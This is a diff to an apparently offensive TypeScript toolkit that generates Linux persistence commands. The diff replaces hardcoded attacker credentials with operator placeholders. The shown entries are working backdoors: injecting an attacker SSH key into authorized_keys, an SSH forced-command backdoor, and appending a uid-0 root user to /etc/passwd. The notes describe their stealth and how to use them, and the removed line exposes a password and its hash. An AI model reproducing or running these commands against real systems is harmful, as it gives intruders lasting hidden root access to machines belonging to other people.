@@ -65,14 +65,14 @@ export function buildLinuxPersistence(lhost: string, lport: string, cmd: string)
     {
       technique: "Authorized_keys injection",
       category: "linux", stealth: 4,
-      command: `mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAA...ATTACKER_PUB_KEY attacker@nexus' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`,
-      notes: "Replace AAAA... with attacker RSA public key. Enables passwordless SSH forever.",
+      command: `mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa <OPERATOR_RSA_PUBKEY> operator@backdoor' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`,
+      notes: "Replace <OPERATOR_RSA_PUBKEY> with your RSA public key (ssh-keygen -t rsa -b 4096). Enables passwordless SSH access.",
     },
     {
       technique: "SSH forced-command backdoor",
       category: "linux", stealth: 5,
-      command: `echo 'command="${safe}",no-port-forwarding,no-X11-forwarding,no-agent-forwarding ssh-rsa AAAA...PUB_KEY' >> ~/.ssh/authorized_keys`,
-      notes: "Executes command on every SSH connection instead of shell. Hard to spot.",
+      command: `echo 'command="${safe}",no-port-forwarding,no-X11-forwarding,no-agent-forwarding ssh-rsa <OPERATOR_RSA_PUBKEY>' >> ~/.ssh/authorized_keys`,
+      notes: "Replace <OPERATOR_RSA_PUBKEY> with your RSA public key. Executes command on every SSH connection instead of shell.",
     },
     {
       technique: "Systemd user service",
@@ -357,8 +357,8 @@ export function buildExtendedLinuxPersistence(lhost: string, lport: string, cmd:
     {
       technique: "Add backdoor root user to /etc/passwd",
       category: "linux", stealth: 2,
-      command: `echo 'nx:$1$nx$fKRQRCnuVi2TlvBqHM6BX.:0:0:root:/root:/bin/bash' >> /etc/passwd`,
-      notes: "Adds user 'nx' with password 'nexus1234' and uid/gid 0 (root). SSH/su with nx:nexus1234. Hash generated with: openssl passwd -1 nexus1234",
+      command: `echo 'nx:$(openssl passwd -1 <OPERATOR_PASSWORD>):0:0:root:/root:/bin/bash' >> /etc/passwd`,
+      notes: "Adds uid/gid 0 (root) backdoor user 'nx'. Replace <OPERATOR_PASSWORD> with your chosen password. Run: openssl passwd -1 <password> to generate the hash.",
     },
     /* ── Kernel module persistence ── */
     {
